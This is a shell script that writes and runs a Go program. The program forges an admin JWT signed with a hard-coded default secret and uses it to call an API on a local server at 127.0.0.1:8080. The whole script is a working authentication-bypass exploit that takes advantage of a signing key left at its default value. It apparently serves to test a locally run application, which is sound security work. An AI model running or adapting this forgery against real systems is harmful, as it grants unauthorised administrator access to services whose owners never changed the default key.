#!/bin/sh
export GOPROXY=https://goproxy.cn,direct
mkdir -p /tmp/bypass && cd /tmp/bypass
cat << 'INNER_EOF' > main.go
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

type Claims struct {
	UserID              string `json:"user_id"`
	Username            string `json:"username"`
	RoleCode            string `json:"role_code"`
	ForcePasswordChange bool   `json:"force_password_change"`
	jwt.RegisteredClaims
}

func main() {
	secret := []byte("lazy-auto-ops-secret-change-me-in-production")
	
	claims := Claims{
		UserID:   "165976d0-d162-409c-bd7f-73b80e053620",
		Username: "admin",
		RoleCode: "admin",
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Hour)),
		},
	}
	
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	tokenString, _ := token.SignedString(secret)

	req, _ := http.NewRequest("GET", "http://127.0.0.1:8080/api/v1/ai/skills", nil)
	req.Header.Set("Authorization", "Bearer "+tokenString)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Request failed:", err)
		return
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println("Response status:", resp.Status)
	fmt.Println("Response body:", string(body))
}
INNER_EOF
go mod init bypass
go get github.com/golang-jwt/jwt/v5
go run main.go